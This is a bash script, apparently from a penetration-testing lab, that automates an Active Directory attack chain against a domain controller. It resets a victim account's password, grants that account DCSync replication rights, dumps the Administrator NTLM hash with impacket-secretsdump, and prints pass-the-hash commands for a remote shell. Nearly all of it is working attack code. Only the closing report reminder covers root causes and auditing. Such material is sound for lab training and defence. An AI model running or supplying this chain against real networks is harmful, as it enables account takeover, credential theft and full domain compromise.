#!/usr/bin/env bash
# ad_chain.sh — the phase 4 path, in one go: reset a password, abuse an ACL,
# get replication rights, dump the krbtgt/Administrator hash, then pass the hash.
#
# Usage:
#   bash ad_chain.sh <DC_IP> <domain> <user> <pass> <victim_user>
#
# Example:
#   bash ad_chain.sh 172.16.10.11 greatnorthern.local jwheeler \
#        'TheOwlsAreNotWhatTheySeem' PMARTELL
#
# The path this automates (from BloodHound):
#   FOO --ForceChangePassword--> VICTIM --WriteDacl--> DOMAIN OBJECT
#   i.e. reset a password, then give that account replication rights, then DCSync.
#
# If your fresh pod has different edges, run loot_ad.sh first and swap the steps.

set -u

DCIP="${1:-}"; DOMAIN="${2:-}"; USER="${3:-}"; PASS="${4:-}"; VICTIM="${5:-}"
NEWPASS="${6:-Bloodhound2026!}"

if [ -z "$DCIP" ] || [ -z "$DOMAIN" ] || [ -z "$USER" ] || [ -z "$PASS" ] || [ -z "$VICTIM" ]; then
  echo "usage: bash ad_chain.sh <DC_IP> <domain> <user> <pass> <victim_user> [new_password]"
  exit 1
fi

step() { echo; echo "=============================================================="; echo "== $*"; echo "=============================================================="; }

step "0. sanity: clock, then confirm the foothold credential works"
sudo ntpdate "$DCIP" 2>/dev/null || echo "[i] ntpdate skipped or unavailable"
nxc smb "$DCIP" -u "$USER" -p "$PASS" | tail -3
echo "-> if this says STATUS_LOGON_FAILURE, stop and re-check the credential."

step "1. ForceChangePassword: reset the victim account"
bloodyad -u "$USER" -p "$PASS" -d "$DOMAIN" --host "$DCIP" set password "$VICTIM" "$NEWPASS"
echo "-> means: you own $VICTIM without knowing the old password. Log it as ForceChangePassword."

step "2. confirm the new credential works"
nxc smb "$DCIP" -u "$VICTIM" -p "$NEWPASS" | tail -3

step "3. WriteDacl: give the victim account replication rights on the domain"
bloodyad -u "$VICTIM" -p "$NEWPASS" -d "$DOMAIN" --host "$DCIP" add dcsync "$VICTIM"
echo "-> means: $VICTIM can now ask the DC to replicate. Replication = read the password database."

step "4. DCSync: pull the Administrator hash"
impacket-secretsdump -just-dc-user Administrator -dc-ip "$DCIP" \
  "$DOMAIN/$VICTIM:$NEWPASS@$DCIP" | tee loot_administrator_hash.txt
echo "-> ignore the aad3b435... half, that is the empty LM hash. The second value is the NTLM hash."

step "5. pass-the-hash onto the DC (this is why NTLM matters)"
HASH="$(grep -oE '[0-9a-f]{32}:[0-9a-f]{32}:::' loot_administrator_hash.txt | tail -1 | cut -d: -f2)"
if [ -n "$HASH" ]; then
  echo "Administrator NTLM hash: $HASH"
  echo
  echo "Run these next:"
  echo "  nxc smb $DCIP -u Administrator -H $HASH"
  echo "  impacket-wmiexec -hashes :$HASH Administrator@$DCIP"
  echo "    then inside: whoami ; dir C:\\ ; type <sensitive file>"
else
  echo "[!] could not parse the hash automatically. Read loot_administrator_hash.txt and copy it."
fi

step "6. reminder for the report"
cat <<'EOF'
For each step above, state the BloodHound edge it abuses, the command, and the screenshot.
Then one sentence per edge on the innocent reason an admin would have set it up:
  ForceChangePassword -> help desk convenience, never revoked when the person changed roles
  WriteDacl on domain -> someone needed to fix permissions once and was handed broad rights
Neither shows up in a normal review, which is why the fix is auditing, not just removal.
EOF
